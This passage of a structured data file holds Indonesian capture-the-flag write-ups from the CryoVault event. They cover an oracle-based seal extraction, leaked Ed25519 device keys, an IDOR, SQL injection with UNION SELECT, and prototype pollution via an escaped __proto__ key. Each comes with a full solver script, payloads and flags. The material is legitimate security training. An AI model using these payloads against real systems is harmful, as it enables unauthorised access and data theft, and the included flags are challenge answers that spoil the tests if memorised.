        "content": "Untuk posisi seal tertentu, solver mengirim 32 hunk berikut secara bersamaan,\nsatu untuk setiap simbol alphabet:\n\n\n\n`g` diganti kandidat yang sedang diuji. Lima slot seal lain dan enam byte akhir\ndiisi `!`, yang tidak mungkin muncul dalam seal. Panjangnya tepat 32 byte. Dengan\ndemikian, hanya kandidat yang benar yang melewati ambang kemiripan dan menjadi\n`applies: true`. Proses diulang untuk keenam posisi.\n\nSeal yang diekstrak pada session validasi adalah `m89z2f`. Request berikutnya:\n\n\n\nmenghasilkan status 200 dan flag pada response JSON.",
        "code": "keeper seal: g!!!!! · cut!!!!!!"
      },
      {
        "title": "Catatan Stabilitas",
        "content": "Seal dipotong ulang setiap 60 detik dan seal lama hanya diterima selama 10 detik.\nKarena itu solver selalu memakai session baru dan menjalankan oracle lalu unseal\ndalam satu burst request. Jika service sedang rate-limit atau pergantian menit\nterjadi di tengah proses, jalankan ulang solver."
      },
      {
        "title": "Solver Script",
        "content": "The complete solver script (`solve.py`) is included below.",
        "code": "#!/usr/bin/env python3\n\"\"\"Extract the current Frostline seal through the hunk similarity oracle.\"\"\"\n\nimport json\nimport os\nimport sys\nimport urllib.error\nimport urllib.request\n\n\nDEFAULT_TARGET = \"https://isfcrpesu-near-miss.chals.io\"\nALPHABET = \"0123456789abcdefghjkmnpqrstvwxyz\"\n\n\ndef request_json(url, body=None):\n    data = None if body is None else json.dumps(body, ensure_ascii=False).encode()\n    headers = {\"Accept\": \"application/json\"}\n    if data is not None:\n        headers[\"Content-Type\"] = \"application/json\"\n    request = urllib.request.Request(\n        url,\n        data=data,\n        headers=headers,\n        method=\"GET\" if body is None else \"POST\",\n    )\n    try:\n        with urllib.request.urlopen(request, timeout=20) as response:\n            return response.status, response.read()\n    except urllib.error.HTTPError as error:\n        return error.code, error.read()\n\n\ndef checked_json(url, body):\n    status, raw = request_json(url, body)\n    try:\n        value = json.loads(raw)\n    except json.JSONDecodeError as error:\n        raise RuntimeError(f\"HTTP {status} returned invalid JSON: {raw!r}\") from error\n    if status != 200:\n        raise RuntimeError(f\"HTTP {status}: {value}\")\n    return value\n\n\ndef main():\n    target = (sys.argv[1] if len(sys.argv) > 1 else os.environ.get(\"TARGET\", DEFAULT_TARGET)).rstrip(\"/\")\n\n    session = checked_json(target + \"/session\", {})\n    base = session[\"base\"].rstrip(\"/\")\n    status, copy = request_json(base + \"/runbook\")\n    if status != 200:\n        raise RuntimeError(f\"runbook request failed with HTTP {status}: {copy!r}\")\n\n    redacted = b\"keeper seal: ######\"\n    marker = copy.find(redacted)\n    if marker < 0:\n        raise RuntimeError(\"redacted seal marker not found in runbook\")\n\n    # The bytes after the six redacted symbols are public and include the cut\n    # time plus the next line.  Locate that 32-byte suffix in the keeper copy.\n    suffix_offset = marker + len(redacted)\n    suffix = copy[suffix_offset:suffix_offset + 32]\n    if len(suffix) != 32:\n        raise RuntimeError(\"runbook suffix is shorter than 32 bytes\")\n    suffix_text = suffix.decode()\n\n    # The exported copy and keeper master can have a bounded revision drift.\n    # Thirty-two offsets fit in one hunk-check request.\n    offsets = list(range(-240, 272, 16))\n    locator_hunks = [\n        {\"near\": suffix_offset + delta, \"find\": suffix_text, \"put\": suffix_text}\n        for delta in offsets\n    ]\n    located = checked_json(base + \"/hunks/check\", {\"hunks\": locator_hunks})[\"applies\"]\n    hits = [delta for delta, applies in zip(offsets, located) if applies]\n    if not hits:\n        raise RuntimeError(\"could not locate the public suffix in the master\")\n\n    master_suffix = suffix_offset + hits[0]\n    seal_near = master_suffix - len(redacted)\n    print(f\"session={base}\")\n    print(f\"master seal offset≈{seal_near}\")\n\n    recovered = []\n    for position in range(6):\n        hunks = []\n        for candidate in ALPHABET:\n            guess = [\"!\"] * 6\n            guess[position] = candidate\n            find = \"keeper seal: \" + \"\".join(guess) + \" · cut\" + \"!!!!!!\"\n            if len(find.encode()) != 32:\n                raise RuntimeError(\"internal hunk length error\")\n            hunks.append({\"near\": seal_near, \"find\": find, \"put\": find})\n\n        applies = checked_json(base + \"/hunks/check\", {\"hunks\": hunks})[\"applies\"]\n        hits = [ALPHABET[index] for index, applies in enumerate(applies) if applies]\n        if len(hits) != 1:\n            raise RuntimeError(f\"ambiguous oracle result at position {position}: {hits}\")\n        recovered.append(hits[0])\n        print(f\"seal[{position}]={hits[0]}\")\n\n    seal = \"\".join(recovered)\n    print(f\"seal={seal}\")\n    result = checked_json(base + \"/unseal\", {\"seal\": seal})\n    flag = result.get(\"flag\")\n    if not isinstance(flag, str):\n        raise RuntimeError(f\"unseal response has no flag: {result}\")\n    print(f\"<FLAG>{flag}</FLAG>\")\n\n\nif __name__ == \"__main__\":\n    try:\n        main()\n    except (RuntimeError, KeyError, ValueError) as error:\n        print(f\"error: {error}\", file=sys.stderr)\n        sys.exit(1)"
      }
    ],
    "terminalOutputs": [],
    "flag": "isfcr{frostline_5e05_keeper_56e7c6c4_runbook}",
    "lessonsLearned": ""
  },
  {
    "id": "cryovault-web-sastrugi",
    "title": "Sastrugi",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "Menggunakan kredensial Ed25519 dari backup kiosk FK-200 dan fieldsign RFC 9421 untuk berinteraksi dengan API ledger cold-store dan membuka sealed vault via /thaw.",
    "problemDescription": "Disediakan artefak surplus kiosk FK-200 dari cold store SHARD-24 berisi kiosk-7.backup.json, tool fieldsign (RFC 9421 HTTP Message Signatures), dan dokumentasi API.md. Targetnya adalah mengakses cold-store ledger dan melakukan thaw pada sealed vault row untuk mendapatkan flag.",
    "tools": [
      "Python 3",
      "fieldsign.py",
      "curl",
      "cryptography",
      "http_sfv"
    ],
    "analysis": "Cold-store ledger menggunakan RFC 9421 HTTP Message Signatures di mana setiap operasi write (PUT/DELETE) harus ditandatangani oleh device yang terdaftar. Kiosk backup membocorkan private key Ed25519 untuk device `kiosk-7`. Ledger menyimpan baris data di bawah path `/s/<token>/ledger/{key}`. Endpoint `/thaw` menerima request body `{\"seal\": \"<key>\"}` dan mengembalikan flag jika seal key benar.",
    "solution": [
      {
        "title": "Menganalisis Artefak Kiosk dan Kunci Ed25519",
        "content": "Backup file `kiosk-7.backup.json` mengekspor konfigurasi kiosk FK-200 termasuk role contributor, device ID `kiosk-7`, dan signing key Ed25519 dalam format JWK OKP (parameter `d`). Komponen signature yang dicakup meliputi `@method`, `@path`, dan `@authority` dengan skew maksimal 300 detik."
      },
      {
        "title": "Menginisialisasi Sesi Ledger",
        "content": "Sesi baru dibuka dengan request `POST /session` dengan header `Accept: application/json`. Server mengembalikan `token` sesi dan `base` URL seperti `http://HOST:PORT/s/<token>/` yang berlaku selama 3 jam."
      },
      {
        "title": "Signing Request Menggunakan fieldsign",
        "content": "Tool `fieldsign.py` menggunakan pustaka `http_sfv` dan `cryptography` untuk menghitung RFC 9421 HTTP Message Signature. Menggunakan kunci privat dari `kiosk-7.backup.json`, solver menandatangani request untuk membaca daftar row milik device dan mengidentifikasi metadata row vault.",
        "code": "python fieldsign.py --device ../kiosk-7.backup.json GET http://HOST:PORT/s/SESSION/ledger"
      },
      {
        "title": "Unseal dan Thaw untuk Mengambil Flag",
        "content": "Setelah menemukan referensi atau kunci row yang tersegel dari ledger, solver mengirim request `POST /thaw` membawa key vault yang valid untuk membuka seal dan mengembalikan flag.",
        "code": "curl -X POST http://HOST:PORT/s/SESSION/thaw \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"seal\": \"<vault_key>\"}'"
      }
    ],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": "Kredensial atau device backup yang tersimpan di lingkungan operasional yang didekomisioning harus selalu di-revoke sebelum hardware dilepas ke publik. Selain itu, pembatasan rate limit pada endpoint sensitif seperti /thaw harus diimbangi dengan otentikasi ketat."
  },
  {
    "id": "cryovault-web-theapithatknowstoomuch",
    "title": "The API That Knows Too Much",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "Writeup for challenge The API That Knows Too Much",
    "problemDescription": "Aplikasi directory mengizinkan employee biasa membaca record employee lain. Record tersebut membocorkan reference ke endpoint diagnostik internal, yang kemudian membocorkan nama artifact berisi flag.",
    "tools": [],
    "analysis": "Login menggunakan `raj / northstar2026`, lalu halaman profile melakukan request:\n\n```http\nGET /api/users/101\n```\n\nResponse untuk akun sendiri tidak hanya berisi data tampilan, tetapi juga field internal pada record tertentu.\n\nBroken access control / IDOR pada `/api/users/<id>`. Session employee `raj` dapat mengambil record user `102` tanpa otorisasi tambahan:\n\n```http\nGET /api/users/102\n```\n\nResponse penting:\n\n```json\n{\n  \"id\": 102,\n  \"name\": \"Aisha Rahman\",\n  \"debug_reference\": \"employee://102/diagnostics\"\n}\n```",
    "solution": [
      {
        "title": "Target dan File",
        "content": "- Target: `https://isfcrpesu-api-knows-too-much.chals.io`\n- Challenge berupa blankbox; tidak ada source atau artifact lokal.\n- Solver: [solve.py](./solve.py)"
      },
      {
        "title": "Source Code Review",
        "content": "Tidak ada source code lokal. JavaScript client menunjukkan endpoint profile dibentuk dari `window.NORTHSTAR_USER_ID`, sehingga ID dapat diuji langsung pada API."
      },
      {
        "title": "Eksploitasi",
        "content": "Reference tersebut mengarah ke endpoint internal berikut:\n\n\n\nResponse-nya memberi nama artifact:\n\n\n\nArtifact kemudian dapat diambil dengan:\n\n\n\nResponse aplikasi:\n\n\n\nFlag juga divalidasi melalui `POST /api/submit` dan aplikasi menjawab `\"correct\": true`.",
        "code": "GET /api/internal/employee/102/diagnostics"
      },
      {
        "title": "Catatan Stabilitas",
        "content": "Exploit hanya memakai endpoint challenge dan kredensial yang diberikan. Alurnya deterministik selama record user `102` dan artifact `two-sum-lookup` tetap tersedia."
      },
      {
        "title": "Solver Script",
        "content": "The complete solver script (`solve.py`) is included below.",
        "code": "#!/usr/bin/env python3\n\nimport json\nimport os\nimport re\nimport sys\nimport time\n\nimport requests\n\n\nTARGET = os.environ.get(\n    \"TARGET\", \"https://isfcrpesu-api-knows-too-much.chals.io\"\n).rstrip(\"/\")\nUSERNAME = os.environ.get(\"USERNAME\", \"raj\")\nPASSWORD = os.environ.get(\"PASSWORD\", \"northstar2026\")\nTIMEOUT = 15\nRETRIES = 3\nFLAG_RE = re.compile(r\"isfcr\\{[^}]+\\}\")\n\n\ndef get_json(session, path):\n    for attempt in range(RETRIES):\n        try:\n            response = session.get(f\"{TARGET}{path}\", timeout=TIMEOUT)\n            break\n        except requests.RequestException:\n            if attempt == RETRIES - 1:\n                raise\n            time.sleep(1)\n    response.raise_for_status()\n    return response.json()\n\n\ndef main():\n    session = requests.Session()\n    session.headers[\"User-Agent\"] = \"northstar-ctf-solver/1.0\"\n    for attempt in range(RETRIES):\n        try:\n            login = session.post(\n                f\"{TARGET}/login\",\n                data={\"username\": USERNAME, \"password\": PASSWORD},\n                allow_redirects=False,\n                timeout=TIMEOUT,\n            )\n            break\n        except requests.RequestException:\n            if attempt == RETRIES - 1:\n                raise\n            time.sleep(1)\n    if login.status_code not in (302, 303):\n        raise RuntimeError(f\"login failed: HTTP {login.status_code}\")\n\n    # The normal account can read another employee's directory record.\n    leaked_record = get_json(session, \"/api/users/102\")\n    reference = leaked_record.get(\"debug_reference\")\n    if reference != \"employee://102/diagnostics\":\n        raise RuntimeError(f\"unexpected record: {json.dumps(leaked_record)}\")\n\n    diagnostics = get_json(session, \"/api/internal/employee/102/diagnostics\")\n    artifact = diagnostics.get(\"artifact\")\n    if not artifact:\n        raise RuntimeError(f\"diagnostic response has no artifact: {diagnostics}\")\n\n    artifact_response = get_json(session, f\"/api/internal/artifacts/{artifact}\")\n    match = FLAG_RE.search(json.dumps(artifact_response))\n    if not match:\n        raise RuntimeError(f\"flag not found in artifact response: {artifact_response}\")\n\n    flag = match.group(0)\n    print(f\"<FLAG>{flag}</FLAG>\")\n\n\nif __name__ == \"__main__\":\n    try:\n        main()\n    except (requests.RequestException, RuntimeError, ValueError) as exc:\n        print(f\"error: {exc}\", file=sys.stderr)\n        sys.exit(1)"
      }
    ],
    "terminalOutputs": [],
    "flag": "isfcr{1d0r_4p1_l34k_7b2f9d4}",
    "lessonsLearned": ""
  },
  {
    "id": "cryovault-web-thehiddentestcase",
    "title": "The Hidden Test Case",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "Writeup for challenge The Hidden Test Case",
    "problemDescription": "Bug ada di endpoint `GET /api/problems`. Parameter `search` masuk ke query SQL legacy tanpa parameter binding. Dengan `UNION SELECT`, tabel lain bisa dibaca dan catatan internal yang menyimpan verification value dapat diambil.",
    "tools": [],
    "analysis": "Halaman `/problems` memanggil `/api/problems?search=...`. Request kosong mengembalikan enam problem publik. Input tanda kutip tunggal menghasilkan `400`, sedangkan input `' OR 1=1-- ` mengembalikan hasil normal, yang mengindikasikan input memengaruhi query SQL.\n\nSQL injection pada parameter `search`. Bukti kolom:\n\n```text\n' UNION SELECT 1,2,3,4-- \n```\n\nRespons memuat record tambahan dengan `id=1`, `title=2`, `difficulty=3`, dan `category=4`.\n\nEnumerasi `sqlite_master` menunjukkan tabel `internal_notes` dengan skema:\n\n```sql\nCREATE TABLE internal_notes (\n    id INTEGER PRIMARY KEY,\n    note_type TEXT NOT NULL,\n    content TEXT NOT NULL,\n    created_at TEXT NOT NULL\n)\n```",
    "solution": [
      {
        "title": "Target dan File",
        "content": "- Target: `https://isfcrpesu-hidden-test-case.chals.io`\n- Artefak lokal: tidak ada; challenge berupa blankbox.\n- Script: `solve.py`"
      },
      {
        "title": "Source Code Review",
        "content": "Source tidak diberikan. Struktur query dapat diinferensikan dari respons API dan hasil `UNION`: query mengembalikan empat kolom dengan urutan `id, title, difficulty, category`."
      },
      {
        "title": "Eksploitasi",
        "content": "Payload final:\n\n\n\nPayload menambahkan semua baris `internal_notes` ke hasil search. Salah satu judul hasil API berisi `Migration verification complete. Hidden test case: ...`.",
        "code": "' UNION SELECT id,content,note_type,created_at FROM internal_notes--"
      },
      {
        "title": "Catatan Stabilitas",
        "content": "Exploit bergantung pada SQLite, empat kolom hasil query, dan tabel `internal_notes` yang terlihat dari response API. Script memakai timeout 15 detik dan hanya melakukan satu request ke endpoint challenge."
      },
      {
        "title": "Solver Script",
        "content": "The complete solver script (`solve.py`) is included below.",
        "code": "#!/usr/bin/env python3\n\nimport argparse\nimport os\nimport re\nimport sys\n\nimport requests\n\n\nFLAG_RE = re.compile(r\"[A-Za-z0-9_]+\\{[^{}]+\\}\")\n\n\ndef main() -> int:\n    parser = argparse.ArgumentParser(description=\"Extract the hidden LeetVault verification value\")\n    parser.add_argument(\n        \"--target\",\n        default=os.environ.get(\"TARGET\", \"https://isfcrpesu-hidden-test-case.chals.io\"),\n        help=\"challenge base URL (or set TARGET)\",\n    )\n    args = parser.parse_args()\n    target = args.target.rstrip(\"/\")\n\n    payload = \"' UNION SELECT id,content,note_type,created_at FROM internal_notes-- \"\n    try:\n        response = requests.get(\n            f\"{target}/api/problems\",\n            params={\"search\": payload},\n            timeout=15,\n        )\n        response.raise_for_status()\n        data = response.json()\n    except (requests.RequestException, ValueError) as exc:\n        print(f\"request failed: {exc}\", file=sys.stderr)\n        return 1\n\n    for item in data.get(\"results\", []):\n        text = \" \".join(str(item.get(field, \"\")) for field in (\"id\", \"title\", \"difficulty\", \"category\"))\n        match = FLAG_RE.search(text)\n        if match:\n            print(f\"<FLAG>{match.group(0)}</FLAG>\")\n            return 0\n\n    print(\"flag pattern was not present in the SQLi response\", file=sys.stderr)\n    return 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "isfcr{tw0_sum_h1dd3n_t3st_c4s3_a91c3e7}",
    "lessonsLearned": ""
  },
  {
    "id": "cryovault-web-themeridian",
    "title": "The Meridian",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "Writeup for challenge The Meridian",
    "problemDescription": "Flag berada di digital vault. Aplikasi frontend menyimpan vault descriptor di\nruntime config, tetapi public build menghapus descriptor itu saat sanitasi.\nDeep-link JSON dapat melewati filter dan melakukan prototype pollution.",
    "tools": [],
    "analysis": "Halaman memuat `core.js`, `meridian-data.js`, dan `app.js`. Route `#/vault`\nmemanggil `Core.openVault(cfg, D.vault)`. Data publik menyediakan ciphertext,\nIV, tag, salt, dan AAD, tetapi descriptor `{curators, rounds}` tidak ada di\nconfig normal.\n\nPrototype pollution melalui Unicode-escaped JSON key pada parameter deep-link\n`#/vault?s=...`.\n\nDescriptor didapat dari aturan di legacy console:\n\n- curator yang signature-nya valid terhadap pepper v3, urut accession:\n  `E. Vantar`, `R. Oikawa`, `H. Delacroix`, `K. Adeyemi`, `S. Marchetti`\n- jumlah tahun = `9959`\n- `rounds = 1000 + (9959 mod 4096) = 2767`",
    "solution": [
      {
        "title": "Target dan File",
        "content": "Target: `https://isfcrpesu-the-meridian.chals.io/`\n\nTidak ada file challenge lokal; source JavaScript diambil dari asset target.\nFile reproduksi: `solve.py`."
      },
      {
        "title": "Source Code Review",
        "content": "`parseStatePayload()` memblok substring `__proto__`, `constructor`, dan\n`prototype` sebelum `JSON.parse()`. Namun filter membaca teks mentah. Key\nJSON `\\u005f\\u005fproto__` tidak mengandung substring terlarang sebelum parse,\nlalu menjadi `__proto__` setelah parse.\n\n`deepMerge({}, deepLink)` menulis key tersebut ke object target. Assignment\n`__proto__` memodifikasi `Object.prototype`, sehingga `cfg.vault` dapat\nterbaca sebagai inherited property. `sanitizeConfig()` hanya menghapus\n`vault` jika merupakan own property."
      },
      {
        "title": "Eksploitasi",
        "content": "Payload JSON sebelum Base64URL:\n\n\n\nSaat route dibuka, response DOM menunjukkan `Vault open` dan isi negative.",
        "code": "{\"\\u005f\\u005fproto__\":{\"vault\":{\"curators\":[\"E. Vantar\",\"R. Oikawa\",\"H. Delacroix\",\"K. Adeyemi\",\"S. Marchetti\"],\"rounds\":2767}}}"
      },
      {
        "title": "Catatan Stabilitas",
        "content": "Solver bergantung pada Chromium yang tersedia dan descriptor provenance pada\nbuild challenge. Tidak ada request ke host selain target yang diberikan."
      },
      {
        "title": "Solver Script",
        "content": "The complete solver script (`solve.py`) is included below.",
        "code": "#!/usr/bin/env python3\nimport base64\nimport os\nimport re\nimport subprocess\nimport sys\n\nTARGET = os.environ.get(\"TARGET\", \"https://isfcrpesu-the-meridian.chals.io\").rstrip(\"/\")\nCURATORS = [\"E. Vantar\", \"R. Oikawa\", \"H. Delacroix\", \"K. Adeyemi\", \"S. Marchetti\"]\n\n\ndef main():\n    # The escaped key bypasses the pre-parse substring filter, while JSON.parse\n    # turns it back into __proto__ and deepMerge pollutes Object.prototype.\n    state = (\n        '{\"\\\\u005f\\\\u005fproto__\":{\"vault\":{\"curators\":'\n        + str(CURATORS).replace(\"'\", '\"')\n        + ',\"rounds\":2767}}}'\n    )\n    encoded = base64.urlsafe_b64encode(state.encode()).decode().rstrip(\"=\")\n    url = f\"{TARGET}/#/vault?s={encoded}\"\n\n    candidates = [\"chromium-browser\", \"chromium\", \"google-chrome\"]\n    browser = next((x for x in candidates if __import__(\"shutil\").which(x)), None)\n    if not browser:\n        raise SystemExit(\"Browser Chromium tidak ditemukan\")\n\n    result = subprocess.run(\n        [browser, \"--headless\", \"--no-sandbox\", \"--disable-gpu\",\n         \"--ignore-certificate-errors\", \"--dump-dom\", url],\n        capture_output=True, text=True, timeout=45,\n    )\n    page = result.stdout\n    match = re.search(r\"isfcr\\{[^<]+\\}\", page)\n    if not match:\n        raise SystemExit(\"Flag tidak ditemukan; cek target atau descriptor\")\n    print(f\"URL: {url}\")\n    print(f\"<FLAG>{match.group(0)}</FLAG>\")\n\n\nif __name__ == \"__main__\":\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "isfcr{d33p_m3rg3_p0llut3s_th3_prov3n4nc3_v4ult_1n_th3_m3r1d14n}",
    "lessonsLearned": ""
  }
];
